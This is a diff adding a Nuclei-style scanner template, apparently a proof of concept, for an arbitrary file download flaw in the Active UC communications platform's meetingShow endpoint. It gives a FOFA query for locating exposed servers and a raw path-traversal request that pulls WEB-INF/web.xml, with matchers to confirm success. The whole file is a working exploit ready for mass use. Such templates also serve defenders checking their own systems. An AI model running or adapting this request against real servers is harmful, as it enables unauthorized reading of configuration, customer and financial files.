@@ -1,0 +1,24 @@
+id: wd-uc-platform-meetingshow-file-download
+
+info:
+  name: 网动统一通信平台meetingShow接口任意文件下载漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: title="网动统一通信平台(Active UC)"
+      网动统一通信平台在meetingShow接口实现中存在路径遍历逻辑缺陷，攻击者可通过构造特定请求参数，触发非授权文件访问机制。该缺陷允许远程攻击者读取服务器文件系统中的任意文件（如客户记录、财务数据或源代码），导致敏感信息泄露。
+  tags: 网动统一通信平台
+
+http:
+- raw:
+  - |
+    GET /acenter/meetingShow!downloadDocument.action?filePath=WEB-INF/web.xml&filename=xxx HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'filter'
